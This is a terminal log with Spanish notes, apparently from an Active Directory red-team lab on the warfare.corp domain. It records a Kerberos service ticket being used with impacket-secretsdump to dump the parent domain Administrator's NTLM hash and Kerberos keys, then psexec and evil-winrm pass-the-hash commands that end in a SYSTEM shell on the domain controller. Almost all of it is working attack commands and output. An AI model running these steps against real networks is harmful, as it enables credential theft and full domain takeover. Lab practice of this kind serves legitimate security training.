[+] Returning cached credential for KRBTGT/CHILD.WARFARE.CORP@CHILD.WARFARE.CORP
[+] Using TGT from cache
[+] Username retrieved from CCache: corpmngr
[*] Getting ST for user
[+] Trying to connect to KDC at CHILD.WARFARE.CORP:88
[+] Trying to connect to KDC at WARFARE.CORP:88
[*] Saving ticket in corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/crta]
└─$ 

export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache



# ¿Qué hace el comando?

Con el TGS de CIFS que tienes para corpmngr, se conecta al Parent DC.

Intenta extraer el hash NTLM (y otros secretos si aplica) del usuario Administrator del dominio padre.
Muestra la información en pantalla y/o la guarda en los logs de Impacket.


Estás usando un Golden Ticket y un Service Ticket CIFS para extraer el hash del Administrador del Parent Domain, lo que te permite comprometer completamente la infraestructura de Active Directory sin conocer contraseñas.

┌──(kali㉿kali)-[~/Downloads/crta]
└─$ impacket-secretsdump  -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
[+] Domain retrieved from CCache: CHILD.WARFARE.CORP
[+] Returning cached credential for CIFS/DC01.WARFARE.CORP@WARFARE.CORP
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01.warfare.corp@WARFARE.CORP to CIFS/DC01.WARFARE.CORP@CHILD.WARFARE.CORP and hoping for the best
[+] Username retrieved from CCache: corpmngr
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for warfare\Administrator 
[+] Calling DRSGetNCChanges for {17446816-c072-445e-ac9b-c0e28630bed6} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:b8844cc6622c448c9b9f657e7a67ad7f9f26fa2c1c7520b7f1ad28389c6fdb91
Administrator:aes128-cts-hmac-sha1-96:cea9408d32669cad4f2938252928b38d
Administrator:des-cbc-md5:614ce65740c8b0a8
[*] Cleaning up... 
                                                                                                                                                                                                                                                            


psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283

evil-winrm -i 10.201.71.91 -u Administrator -H b2ab0552928c8399da5161a9eb7fd283



──(kali㉿kali)-[~/Downloads/crta]
└─$ impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:dc01.warfare.corp[\pipe\svcctl]
[*] Requesting shares on dc01.warfare.corp.....
[*] Found writable share ADMIN$
[*] Uploading file gZSzDNRm.exe
[*] Opening SVCManager on dc01.warfare.corp.....
[*] Creating service KavA on dc01.warfare.corp.....
[*] Starting service KavA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
